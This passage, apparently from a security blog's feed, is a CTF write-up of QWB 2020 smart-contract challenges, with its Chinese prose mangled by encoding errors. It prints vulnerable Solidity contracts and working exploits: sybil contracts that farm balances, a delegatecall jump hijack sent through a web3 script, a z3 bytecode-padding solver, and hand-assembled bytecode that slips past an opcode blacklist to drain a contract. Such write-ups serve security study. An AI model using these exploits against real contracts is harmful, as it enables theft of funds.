å›¾ç‰‡å³å¯ï¼ŒæŽ’åˆ—ç»„åˆå³å¯(å¯ä»¥å…ˆæ‰¾åˆ°æ–‡ä»¶å¤´æ‰€åœ¨çš„ block å’Œæ–‡ä»¶å°¾æ‰€åœ¨çš„ block ï¼Œå¯¹å‰©ä½™ 4 ä¸ª block æŽ’åˆ—ç»„åˆ) æŽ’åˆ—ç»„åˆçš„è„šæœ¬å¦‚ä¸‹ï¼Œ3.jpg ä¾¿æ˜¯ pic1.jpg 1234567891011121314import osimport itertoolsl = ["QmZkF524d8HWfF8k2yLrZwFz9PtaYgCwy3UqJP5Ahk5aXH", "Qme7fkoP2scbqRPaVv6JEiaMjcPZ58NYMnUxKAvb2paey2", "QmU59LjvcC1ueMdLVFve8je6vBY48vkEYDQZFiAbpgX9mf", "QmfUbHZQ95XKu9vd5XCerhKPsogRdYHkwx8mVFh5pwfNzE"]index = 1for i in itertools.permutations('0123', 4): os.system("ipfs cat QmXh6p3DGKfvEVwdvtbiH7SPsmLDfL7LXrowAZtQjkjw73 &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) for j in i: print j os.system("ipfs cat " + l[int(j)] + " &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) os.system("ipfs cat QmXFSNiJ8BdbUKPAsu3oueziyYqeYhi3iyQPXgVSvqTBtN &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) print(index) index = index + 1 å¾—åˆ°ä¿¡æ¯ flag=flag{md5(hash1+hash2)} ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ° hash1 ï¼Œå¾ˆç®€å•ï¼Œåªéœ€è¦æˆ‘ä»¬é‡æ–°ä¸Šä¼ ä¸€ä¸‹ pic1.jpg å³å¯ï¼Œsize çš„å¤§å°å¯ä»¥æ ¹æ®åˆ†å— block å¯¹åº”çš„æ–‡ä»¶çš„å¤§å°èŽ·å¾— 1ipfs add -s size-26624 pic1.jpg å¾—åˆ° hash1 = QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7 flag=flag{md5(hash1+hash2)}=flag{35fb9b3fe44919974a02c26f34369b8e} EasyFake æ€è·¯æ¥è‡ª rw2018 é¦–å¸­çš„é¢˜ç›®ï¼Œè§‰å¾—ç‚¹å­å¾ˆå¥½ï¼Œç›´æŽ¥æŠŠé¦–å¸­é¢˜ç›®çš„ç‚¹å­æ‹¿äº†è¿‡æ¥23333ï¼Œå‹¿å–·ï¼Œç®€åŒ–ç‰ˆ å¯ä»¥å€ŸåŠ© ida-evm ç­‰å·¥å…·æŸ¥çœ‹å…¶å‡½æ•°è°ƒç”¨å›¾åŠå…¶ç»†èŠ‚ è–…ç¾Šæ¯›æ˜¯é€åˆ†çš„ï¼Œè€ƒç‚¹æ˜¯ delegatecall ï¼Œç›´æŽ¥ä»‹ç»åˆ©ç”¨æ€è·¯ Source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.4.23;contract EasyFake &#123; uint public qwb_version = 4; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public status; string public constant hello = &quot;Welcome to S4 of qwb! Enjoy yourself :D&quot;; uint private constant randomNumber = 0; event SendFlag(address addr); constructor() public &#123; assembly &#123; sstore(0x1234, 0x4804a623) &#125; &#125; modifier onlyHuman&#123; uint size; address addr = msg.sender; assembly &#123; size := extcodesize(addr) &#125; require(size==0); _; &#125; function gift() public payable &#123; require(status[msg.sender]==0); balanceOf[msg.sender] += 10; status[msg.sender] = 1; &#125; function transferbalance(address to,uint amount) public &#123; require(balanceOf[msg.sender]&gt;=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; &#125; function payforflag(string s) public payable onlyHuman &#123; require(keccak256(abi.encodePacked(s)) == keccak256(&quot;iloveqwb&quot;)); if (balanceOf[msg.sender]&gt;=1000 &amp;&amp; msg.value == 1 ether) &#123; assembly &#123; mstore(0x800, 0x1234) mload(0x800) dup1 mstore(0x2000, 0x06ee) mload(0x2000) and(caller, 0xffff) jump pop pop pop &#125; &#125; else &#123; selfdestruct(msg.sender); &#125; &#125; function backdoor() public &#123; assembly &#123; mstore(0x2000,0x20) mload(0x2000) mstore(0x2000,0x0) mstore(0x2100,0x1234) mload(0x2100) mstore(0x2100,0) sload(extcodesize(caller)) mstore(0x20, sload(0x1234)) mstore(0x5000,0x3c) mload(0x5000) mstore(0x5000, 0x0) calldataload(0x7e) gas calldataload(0x5e) jump pop pop pop pop pop pop &#125; &#125; function() public payable &#123;&#125;&#125; Analyse å¯¹ä¸Šè¿°æºç ç¼–è¯‘ç”Ÿæˆçš„å­—èŠ‚ç è¿›è¡Œäº†ä¸€äº›æ”¹åŠ¨ï¼Œå®Œæ•´çš„å­—èŠ‚ç å¯åœ¨é“¾ä¸ŠæŸ¥æ‰¾åˆ° é¢˜ç›®è¦æ±‚è§¦å‘ SendFlag äº‹ä»¶ï¼Œå¯æ˜¯å¹¶æ²¡æœ‰ SendFlag ï¼Œæ‰€ä»¥éœ€è¦ delegatecall ï¼Œè¿™ä¸ªæ„å›¾åº”è¯¥å¾ˆæ˜Žæ˜¾ å¯¹äºŽ backdoor å‡½æ•°ï¼Œå…¶å‡½æ•°æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼Œä¼šè·³è½¬åˆ° calldataload(0x5e) ï¼Œè¿™ä¸ªå¾ˆæ˜Žæ˜¾ï¼Œæˆ‘ä»¬è¦è·³è½¬åˆ° delegatecall çš„ä½ç½®ï¼ŒæŸ¥çœ‹å­—èŠ‚ç ï¼Œå¯ä»¥æ‰¾åˆ°ä½ç½®ä¸º 0x740 ï¼Œæ‰€ä»¥ calldataload(0x5e:0x7e)=0x740 ã€‚å¹¶ä¸”è®¾ç½®äº† memory[0x20,0x40]=sload(0x1234)=0x4804a623 ï¼Œå¯åœ¨https://www.4byte.directory/æŸ¥è¯¢åˆ°æ˜¯ getflag() å‡½æ•° 1234567calldataload(0x5e) æ ˆé¡¶gasRemainingcalldataload(0x7e)0x3c0x40x12340x20 æ ˆåº• 0x740 ä½ç½®ä»£ç ä¸º 5bf45056ï¼Œå³å¦‚ä¸‹ 1234JUMPDESTdelegatecallpopjump delegatecall å‚æ•°å¯¹åº”æ ˆå¦‚ä¸‹ï¼Œæ‰€ä»¥ calldataload(0x7e:0x9e)ä¸ºdelegatecall è°ƒç”¨çš„ hack åˆçº¦åœ°å€ï¼Œmemory[0x3c:0x40]=0x4804a623 ï¼Œå³è°ƒç”¨ hack åˆçº¦ä¸­çš„ getflag() å‡½æ•°ï¼Œè¿”å›žå€¼ä¿å­˜åœ¨ memory[0x1234:0x1234+0x20] ä¸­ 123456gas gasRemainingaddr calldataload(0x7e)argsOffset 0x3cargsLength 0x4retOffset 0x1234retLength 0x20 æ ˆåº• è°ƒç”¨å®Œå‡½æ•°æ ˆä¸ºç©ºï¼Œä½†æ­¤æ—¶æœ‰ä¸ª jump ï¼Œè¦è·³è½¬åˆ°å“ªé‡Œå‘¢ï¼Œæˆ‘ä»¬å‘ä¸Šæ‰¾ï¼Œå‘çŽ° payforflag é‡Œé¢æœ‰ä¸€äº›æ“ä½œï¼Œæ ˆè¯¦æƒ…å¦‚ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªä»»æ„ caller æŽ§åˆ¶çš„è·³è½¬ 1234caller &amp; 0xffff0x6ee0x12340x1234 å‡è®¾è·³è½¬åˆ° backdoor ä½ç½®ï¼Œå³ 0x06f2 ï¼Œå³è¦æ±‚ caller æœ€ä½Žå››å­—èŠ‚ä¸º 0x06f2 ï¼Œç»“åˆä¸Šé¢çš„åˆ†æžï¼Œä¸Šè¿°æ‰§è¡Œå®Œ delegatecall ä¹‹åŽä¼šè·³è½¬åˆ° 0x6ee ï¼ŒæŸ¥çœ‹ 0x6ee å¤„çš„å­—èŠ‚ç æ˜¯ 5b510156 ï¼Œæ“ä½œç å¦‚ä¸‹ 1234JUMPDESTMLOADADDJUMP æ­¤æ—¶æ ˆå˜æˆäº†ä¸‹é¢è¿™æ ·ï¼Œå³ä¼šè·³è½¬åˆ° mload(0x1234)+0x1234 ï¼Œæ­¤æ—¶æ ˆä¸ºç©ºï¼Œè€Œ 123addmload(0x1234)0x1234 ä¸ºäº†ä¿æŒæ ˆå¹³è¡¡ï¼Œæˆ‘ä»¬éœ€è¦è·³è½¬åˆ° stop çš„ä½ç½®ï¼Œæ­£å¸¸ç»“æŸå¹¶ç»´æŒæ ˆå¹³è¡¡ï¼Œå¯ä»¥æ‰¾åˆ° 0x2c1 ä½ç½®ï¼Œå³ mload(0x1234)+0x1234=0x2c1 å³å¯ï¼Œå³è¦æ±‚ hack åˆçº¦ä¸­çš„ getflag() å‡½æ•°è¿”å›žå€¼ä¸º 0x2c1-0x1234=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d Exp ä½¿ç”¨ä¸‹é¢ä»£ç è–…ç¾Šæ¯›ï¼Œè½¬åˆ°åœ°å€æœ€åŽå››å­—èŠ‚ä¸º 0x06f2 12345678910111213141516contract father &#123; constructor() public &#123; for (uint i=0; i&lt;100; i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; EasyFake tmp = EasyFake(0x742eB40659c7Dae2CD436B9E2741696a2F622DB2); tmp.gift(); tmp.transferbalance(address(0x15697F62095549B50F2897F6840D36aB1e0b06f2),10); &#125;&#125; éƒ¨ç½² hack åˆçº¦ï¼Œä½œä¸º delegatecall å‚æ•° 1234567contract hack &#123; event SendFlag(address addr); function getflag() payable public returns(uint256) &#123; emit SendFlag(msg.sender); return 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d; &#125;&#125; ä½¿ç”¨æœ€åŽå››å­—èŠ‚ 0x06f2 çš„è¿™ä¸ªè´¦æˆ·è°ƒç”¨ payforflag å‡½æ•°ï¼Œæ ¹æ®å¦‚ä¸Šåˆ†æžï¼Œpayload å¦‚ä¸‹æ‰€ç¤º 12345678910111213141516171819202122232425262728293031323334from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider(&apos;https://ropsten.infura.io/v3/xxxxxxxxxxx&apos;))# contract_instance = web3.eth.contract(address=config[&apos;address&apos;], abi=config[&apos;abi&apos;])contract_address = &quot;0x742eB40659c7Dae2CD436B9E2741696a2F622DB2&quot;private = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;public = &quot;0x15697F62095549B50F2897F6840D36aB1e0b06f2&quot;data = &apos;0x6bc344bc&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000020&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000008&apos;data += &apos;696c6f7665717762000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000740&apos;data += &apos;000000000000000000000000882DfFd71DFb9A8f0E5985207587ebd77611A9f3&apos;data += &apos;0000&apos;def do_callme(public): txn = &#123; &apos;from&apos;: Web3.toChecksumAddress(public), &apos;to&apos;: Web3.toChecksumAddress(contract_address), &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 8000000, &apos;nonce&apos;: w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(1, &apos;ether&apos;), &apos;data&apos;: data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptprint(do_callme(public)) EasyAssembly é¢˜ç›®æ€è·¯æ¥è‡ªäºŽ rw2019 è€ƒç‚¹æœ‰ä¸¤ä¸ªï¼š åœ¨åˆçº¦å­—èŠ‚ç åŽè¿›è¡Œ padding ä¸ä¼šå½±å“åˆçº¦çš„éƒ¨ç½² create2 åˆ›å»ºåœ°å€çš„æ–¹å¼ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.5.10;contract EasyAssembly &#123; event SendFlag(address addr); uint randomNumber = 0; bytes32 private constant ownerslot = keccak256(&apos;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&apos;); bytes32[] public puzzle; uint count = 0; mapping(address=&gt;bytes32) WinChecksum; constructor() public payable &#123; setAddress(ownerslot, msg.sender); &#125; modifier onlyWin(bytes memory code) &#123; require(WinChecksum[msg.sender] != 0); bytes32 tmp = keccak256(abi.encodePacked(code)); address target; assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1) &#125; require(address(target)==msg.sender); _; &#125; function setAddress(bytes32 _slot, address _address) internal &#123; bytes32 s = _slot; assembly &#123; sstore(s, _address) &#125; &#125; function deploy(bytes memory code) internal returns(address addr) &#123; assembly &#123; addr := create2(0, add(code, 0x20), mload(code), 0x1234) if eq(extcodesize(addr), 0) &#123; revert(0, 0) &#125; &#125; &#125; function gift() public payable &#123; require(count == 0); count += 1; if(msg.value &gt;= address(this).balance)&#123; emit SendFlag(msg.sender); &#125;else&#123; selfdestruct(msg.sender); &#125; &#125; function pass(uint idx, bytes memory bytecode) public &#123; address addr = deploy(bytecode); bytes32 cs = tag(bytecode); bytes32 tmp = keccak256(abi.encodePacked(uint(1))); uint32 v; bool flag = false; assembly &#123; let v1,v2 v := sload(add(tmp, idx)) if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125; &#125; if(flag)&#123; WinChecksum[addr] = cs; &#125;else&#123; WinChecksum[addr] = bytes32(0); &#125; &#125; function tag(bytes memory a) pure public returns(bytes32 cs) &#123; assembly&#123; let groupsize := 16 let head := add(a,groupsize) let tail := add(head, mload(a)) let t1 := 0x13145210 let t2 := 0x80238023 let m1,m2,m3,m4,s,tmp for &#123; let i := head &#125; lt(i, tail) &#123; i := add(i, groupsize) &#125; &#123; s := 0x59129121 tmp := mload(i) m1 := and(tmp,0xffffffff) m2 := and(shr(0x20,tmp),0xffffffff) m3 := and(shr(0x40,tmp),0xffffffff) m4 := and(shr(0x60,tmp),0xffffffff) for &#123; let j := 0 &#125; lt(j, 0x4) &#123; j := add(j, 1) &#125; &#123; s := and(mul(s, 2),0xffffffff) t2 := and(add(t1, xor(sub(mul(t1, 0x10), m1),xor(add(t1, s),add(div(t1,0x20), m2)))), 0xffffffff) t1 := and(add(t2, xor(add(mul(t2, 0x10), m3),xor(add(t2, s),sub(div(t2,0x20), m4)))), 0xffffffff) &#125; &#125; cs := xor(mul(t1,0x100000000),t2) &#125; &#125; function payforflag(bytes memory code) public onlyWin(code) &#123; emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125;&#125; Analyse tag æ˜¯å¯¹å­—èŠ‚ç è¿›è¡Œç¼–ç å¾—åˆ° csï¼Œpass æ˜¯å¯¹ cs è¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥åˆ†æžå‘çŽ°æ˜¯å¯¹ owner è¿›è¡Œç›¸å…³è®¡ç®—ï¼Œå¯¹å…¶ç»“æžœè®°ä¸º targetï¼Œå³ csç»è¿‡æ ¡éªŒåŽç­‰äºŽ target æ”»å‡»åˆçº¦hackï¼ŒèŽ·å–bytecode 12345678contract hack &#123; address instance_address = 0xbA2e98a2795c193F58C8CE1287fDA28e089c313a ; EasyAssembly target = EasyAssembly(instance_address); function hack1(bytes memory code) public &#123; target.payforflag(code); &#125;&#125; æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¯¹åˆçº¦å­—èŠ‚ç è¿›è¡Œç¼–ç åŽæ­£å¥½ç­‰äºŽç‰¹å®šæŸä¸ªå€¼çš„å‡ çŽ‡å‡ ä¹Žä¸º 0 ï¼Œæ‰€ä»¥éœ€è¦å¦æƒ³åŠžæ³•ï¼Œè¿™é‡Œç”¨åˆ°è€ƒç‚¹ä¸€ï¼Œåˆçº¦å­—èŠ‚ç åŽè¿›è¡Œ padding ä¸ä¼šå½±å“åˆçº¦çš„éƒ¨ç½² ä½¿ç”¨ tag è®¡ç®—æ”»å‡»åˆçº¦ hack å­—èŠ‚ç çš„ cs ï¼Œç„¶åŽæˆ‘ä»¬è®¡ç®—éœ€è¦ padding çš„å­—èŠ‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from z3 import *def find(last, target): t1, t2 = int(last[:8], 16), int(last[8:], 16) tar1, tar2 = int(target[:8], 16), int(target[8:], 16) s = 0x59129121 s = BitVecVal(s, 256) m1 = BitVec('m1', 256) m2 = BitVec('m2', 256) m3 = BitVec('m3', 256) m4 = BitVec('m4', 256) for j in range(4): s = (s + s) &amp; 0xffffffff p1 = (t1&lt;&lt;4) - m1 p2 = t1 + s p3 = (t1&gt;&gt;5) + m2 t2 = (t1 + (p1^(p2^p3))) &amp; 0xffffffff p1 = (t2&lt;&lt;4) + m3 p2 = t2 + s p3 = (t2&gt;&gt;5) - m4 t1 = (t2 + (p1^(p2^p3))) &amp; 0xffffffff sol = Solver() sol.add(And(t1 == tar1, t2 == tar2)) if sol.check(): m = sol.model() m_l = map(lambda x: m[x].as_long(), [m4, m3, m2, m1]) pad = 0 for x in m_l: pad &lt;&lt;= 0x20 pad |= x return hex(pad)[2:].zfill(32) else: raise Exception('No solution')def cal_target(address): a = address &amp; 0xffffffff b = address&gt;&gt;0x20 &amp; 0xffffffff c = address&gt;&gt;0x40 &amp; 0xffffffff d = address&gt;&gt;0x60 &amp; 0xffffffff e = address&gt;&gt;0x80 &amp; 0xffffffff v1 = (a+b) &amp; 0xffffffff v2 = ((c ^ d) + e) &amp; 0xffffffff target = v2&lt;&lt;0x20 | v1 print hex(target) return hex(target)address = 0x000000000000000000000000082d1deb3d08277650966471756b06fead5cb43flast = "a7f27fea495824ae"target = cal_target(address)[2:]print find(last, target) è°ƒç”¨ pass ï¼Œå…¶ä¸­ idx ä¸º owner æ‰€åœ¨çš„ slot ä¸Ž puzzle æ•°ç»„æ•°æ®èµ·å§‹ä½ç½®çš„å·®å€¼ï¼Œæ˜¯ä¸ªå›ºå®šå€¼17666428025195830108258939064971598484477117555719083663154155265588858226250 ï¼Œbytecode æ˜¯è¿›è¡Œ padding ä¹‹åŽçš„å­—èŠ‚ç ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„å­—èŠ‚ç  16 å­—èŠ‚å¯¹é½ï¼‰ è°ƒç”¨ hack æ”»å‡»åˆçº¦çš„ hack1 å³å¯ï¼Œè¿™é‡Œçš„ code æ˜¯ create2() ä¸­çš„å‚æ•°ï¼Œå¯é€šè¿‡ä¸‹è¿°è„šæœ¬è®¡ç®—ï¼Œcode å°±æ˜¯è„šæœ¬ä¸­çš„ s Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:] 1234567891011121314from web3 import Web3def bytesToHexString(bs): return ''.join(['%02X' % b for b in bs])bytecode = '0x608060405273ba2e98a2795c193f58c8ce1287fda28e089c313a6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c657600080fd5b50610248806100d66000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063489dc88514610030575b600080fd5b6100e96004803603602081101561004657600080fd5b810190808035906020019064010000000081111561006357600080fd5b82018360208201111561007557600080fd5b8035906020019184600183028401116401000000008311171561009757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506100eb565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662a9a87e82306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019080838360005b838110156101ab578082015181840152602081019050610190565b50505050905090810190601f1680156101d85780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505056fea265627a7a72315820fc052defd6381390e09fa96b74c0f55872043fcede05171fb78f3c814d755fe664736f6c6343000511003200007197d58f43114ce23d95b93f9df2bb08'a = '0xff' # 1 byteb = 'bA2e98a2795c193F58C8CE1287fDA28e089c313a' # b: deploy address 20 bytesc = '0'*60 + '1234' # c: seed 32 bytesd = bytesToHexString(Web3.sha3(hexstr=bytecode)) # deploy bytecode 32 bytess = a+b+c+dprint(s)address = '0x' + bytesToHexString(Web3.sha3(hexstr=s))[24:]print(address) EasySandboxSource1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.5.10;contract EasySandbox &#123; uint256[] public writes; mapping(address =&gt; address[]) public sons; address public owner; uint randomNumber = 0; constructor() public payable &#123; owner = msg.sender; sons[msg.sender].push(msg.sender); writes.length -= 1; &#125; function given_gift(uint256 _what, uint256 _where) public &#123; if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) &#123; writes[_where] = _what; &#125; &#125; function easy_sandbox(address _addr) public payable &#123; require(sons[owner][0] == owner); require(writes.length != 0); bool mark = false; for(uint256 i = 0; i &lt; sons[owner].length; i++) &#123; if(msg.sender == sons[owner][i]) &#123; mark = true; &#125; &#125; require(mark); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); require(writes.length == 0); require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin); &#125;&#125; Analyse é¢˜ç›®é€†å‘è¿˜æ˜¯æœ‰éš¾åº¦çš„ï¼ŒåŽæ¥ç›´æŽ¥ç»™äº†æºç  è€ƒç‚¹æœ‰ä¸‰ä¸ªï¼š è€ƒå¯Ÿå¯¹åŠ¨æ€æ•°ç»„ã€mapç±»åž‹æ•°æ®çš„å­˜å‚¨è§„åˆ™è®¡ç®— è€ƒå¯Ÿå¯¹ EVM æ‰§è¡Œçš„ç†è§£ è€ƒå¯Ÿ create2 å¯ä»¥çœ‹åˆ°ä¸»ä½“å‡½æ•°å°±ä¸¤ä¸ª given_gift ä»»æ„å†™ easy_sandbox è¿‡æ»¤äº† f0ã€f1ã€f2ã€f4ã€faã€ff è¿™äº›å­—èŠ‚ï¼Œå¦‚æžœç«™åœ¨æ“ä½œç å±‚æ¬¡ï¼Œè¿™äº›å­—èŠ‚å¯¹åº”æ“ä½œç åˆ†åˆ«æ˜¯ createã€callã€callcodeã€delegatecallã€staticcallã€selfdestructï¼Œç›¸å½“äºŽè¿™äº›æ“ä½œç éƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå¦‚æžœæƒ³è¦æ¸…ç©ºåˆçº¦ä½™é¢çš„è¯ï¼Œåªèƒ½ä½¿ç”¨ create2 åˆ›å»ºä¸€ä¸ªç±»ä¼¼è½¬è´¦çš„åˆçº¦ Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.5.10;contract EasySandbox &#123; function given_gift(uint256 _what, uint256 _where) public &#123;&#125; function easy_sandbox(address _addr) public payable &#123;&#125;&#125;/*owner 0x3d16CAAf6E5C0bB28787F38Aba430E17F301e737tx.origin 0x1e7AEf620B2ad727193DD1B2ADda7f1e535CbfB3pos1 = kec(owner | 1) = 0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8pos2 = kec(kec(owner | 1)) = 0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399sstore(pos1, 1) 60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a87f70000000000000000000000070000000000000007000000000000077000000000155[1] PUSH1 0x01[34] PUSH32 0x8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a8[67] PUSH32 0x7000000000000000000000007000000000000000700000000000007700000000[68] ADD[69] SSTOREsstore(0, 0) 60008055[1] PUSH1 0x00[2] DUP1[3] SSTOREsstore(pos2, tx.origin) 327f30000000000000000000000000000000050000000000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a53990355[0] ORIGIN[33] PUSH32 0x3000000000000000000000000000000005000000000000000000000000000000[66] PUSH32 0x8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a5399[67] SUB[68] SSTOREcreate2 SELFDESTRUCT 6132fe6001013452346004601c3031f5[2] PUSH2 0x32fe[4] PUSH1 0x01[5] ADD[6] CALLVALUE[7] MSTORE[8] CALLVALUE[10] PUSH1 0x04[12] PUSH1 0x1c[13] ADDRESS[14] BALANCE[15] CREATE2*/contract pikachu &#123; constructor() public payable &#123; assembly &#123; mstore(0x00, 0x60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc0998882) mstore(0x20, 0x4b60a87f70000000000000000000000070000000000000007000000000000077) mstore(0x40, 0x00000000015560008055327f3000000000000000000000000000000005000000) mstore(0x60, 0x0000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0) mstore(0x80, 0xe8fde9e79a67c38a7cf69a539903556132fe6001013452346004601c3031f500) return(0x00, 0xa0) &#125; &#125;&#125;contract Hack &#123; EasySandbox private constant target = EasySandbox(0xde07f6D17206CdC4f2Af94ad9e6324544a70a360); constructor() public payable &#123; bool result; // modify kec(owner | 1) = 2 (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, 2, uint(0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563) )); require(result); // modify kec(kec(owner | 1)) + 1 = msg.sender (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, uint(address(this)), uint(0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563+1) )); require(result); // writes.length == 0 // sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin // empty balance pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc94103b1, hack )); require(result); &#125;&#125; å…·ä½“è¿‡ç¨‹éƒ½åœ¨ä¸Šé¢ exp çš„æ³¨é‡Šé‡Œé¢ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š ç”±äºŽ sandbox ç¦æ­¢çš„æ˜¯ç‰¹å®šçš„å­—èŠ‚ï¼Œè€Œä¸æ˜¯ç‰¹å®šçš„æ“ä½œç ï¼Œè¿™æ„å‘³ç€åœ¨ä¸Šä¸‹æ–‡ä¸­ä¹Ÿç¦æ­¢è¿™äº›å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ code è¦ä½¿ç”¨å­—èŠ‚ç ç¼–å†™ è‹¥åœ¨æ”»å‡»å­—èŠ‚ç ä¸­å‡ºçŽ°äº† sandbox ä¸­çš„é»‘åå•å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å·§å¦™çš„æ–¹å¼åŽ»ç»•è¿‡å®ƒ]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€æ­¥ä¸€æ­¥æž„å»º dl-runtime-resolve]]></title>
    <url>%2F2020%2Fstepbystep-dl-runtime-resolve%2F</url>
